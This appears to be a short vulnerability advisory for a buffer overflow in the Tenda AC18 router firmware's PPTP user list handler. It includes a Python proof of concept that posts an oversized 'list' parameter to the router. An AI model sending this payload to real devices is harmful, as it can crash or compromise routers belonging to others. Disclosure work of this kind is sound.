## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a buffer overflow vulnerability in the `formSetPPTPUserList` function. The `Var` variable receives the `list` parameter from a POST request and is later passed to the `strspn` function. However, since the Since user can control the input of  `list`, the statemeant `v4 = strspn(Var, "~");` can cause a buffer overflow.

## POC

```python
import requests

ip = "192.168.1.1"

url = f'http://{ip}/goform/setPptpUserList'
payload = b'a' * 1000
data = {
    'list':payload
}

requests.post(url, data=data)
```

![image-20250603000202009](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000202009.png)
